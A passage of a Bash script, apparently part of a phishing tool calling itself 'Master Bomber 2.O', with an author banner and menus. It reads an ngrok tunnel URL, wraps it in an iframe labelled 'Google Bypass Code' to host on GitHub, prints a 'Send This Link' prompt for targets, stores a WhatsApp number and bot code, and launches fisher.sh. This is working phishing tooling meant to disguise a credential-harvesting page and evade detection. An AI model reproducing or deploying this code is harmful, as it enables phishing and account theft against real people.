link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
status=$(curl -s -o /dev/null -I -w "%{http_code}" $link)
stat=$(echo "$status")
echo 'hiii'
if [ "$stat" = "200" ];
then
echo -e  "\e[1;92m[\e[34m•\e[1;92m] Link working code \e[34m[\e[0m200\e[34m]\e[0m"
touch bypass.html
cat > bypass.html << EOF
<iframe name="$site" src="$link" width="100%" height="100%" frameborder="0" scrolling="yes" style="width: 100%;"> </iframe>
EOF
bypass=$(cat bypass.html)
echo
echo -e  "\e[92m[-------------\e[34mGoogle Bypass Code\e[92m-------------]\e[91m"
echo -e  "\e[0m$bypass \e[0m"                                                     
echo -e  "\e[92m[-----------\e[34mUse This Code in Github\e[92m----------]\e[92m"
echo
echo -e  "\e[1;92m[\e[34m•\e[1;92m] Send This Link: \e[0m$link\e[0m"
checkfound
else
echo -e  "\e[1;92m[\e[34m•\e[1;92m] Link working code \e[34m[\e[91m000\e[34m]\e[0m"
echo
echo -e  "\e[92m[-------------\e[34mGoogle Bypass Code\e[92m-------------]\e[91m"
echo -e  "\e[0m$bypass \e[0m"
echo -e  "\e[92m[-----------\e[34mUse This Code in Github\e[92m----------]\e[91m"
echo
echo -e  "\e[1;92m[\e[34m•\e[1;92m] Send This Link: \e[0m$link\e[0m"
checkfound
fi
}

about () {
clear
echo -e '\e[91m
                     ──▐─▌──▐─▌──
                     ─▐▌─▐▌▐▌─▐▌─
                     ─█▄▀▄██▄▀▄█─
                     ──▄──██▌─▄──
                     ▄▀─█▀██▀█─▀▄
                     ▐▌▐▌─▐▌─▐▌▐▌
                     ─▐─█────█─▌─
                     ────▌──▐────
'
echo -e "\e[93m                    CALL ME \e[92mJATT" | pv -qL 10
echo -e "\e[93m               REAL NAME \e[92mJATIN KALWAR" | pv -qL 10
echo -e "\e[93m             IAM FROM \e[92mYOURHACKINGHOUSE" | pv -qL 10
echo -e "\e[93m        IM A \e[92mGEEK\e[93m WITH LOTS OF EXCITEMENT" | pv -qL 10
echo -e "\e[93m       HOPE YOU LIKE THIS MASTER BOMBER 2.O" | pv -qL 10
echo -e "\e[93m         OOPS... I TALK A LOT SRY FOR THAT " | pv -qL 10
echo -e "\e[93m              JOIN GROUPS ON \e[92mWHATS' APP" | pv -qL 10
echo -e "\e[93m        MY WEBSITE:\e[92m https://bit.ly/2QT6dSR \e[0m" | pv -qL 10

echo -e "\e[92m                BYEE.............." | pv -qL 10
sleep 8.0
clear
menu
}

moremenu () {
banner
echo
echo -e "\e[92m[1]---------- Whats App Forward Setup\e[0m"
echo -e "\e[92m[2]---------- Google Bypass Hack\e[0m"
echo
echo -ne "\e[92m Select Option: \e[92m"
read opto
if [ "$opto" = "1" ]
then
echo
echo -e "        If You Dont Now This Then Ask Developer"
echo
echo -e "\e[93m   example: +91629xxxxxxx\e[92m"
echo -ne "\e[92m   Number With Country Code: \e[92m"
read numz
nun=$(echo "$numz" > num.txt)
echo -e "\e[93m   example: 728992\e[92m"
echo -ne "\e[92m   Add code by Bot: \e[92m"
read keyz
nunz=$(echo "$keyz" > key.txt)
echo
echo -e "\e[92m Success...Now Use Tool and Check Whats App.."
echo
elif [ "$opto" = "2" ]
then
banner
menu
am start -a android.intent.action.VIEW -d https://tinyurl.com/whatschat > /dev/null 2>&1
fi
bash fisher.sh
}
menu
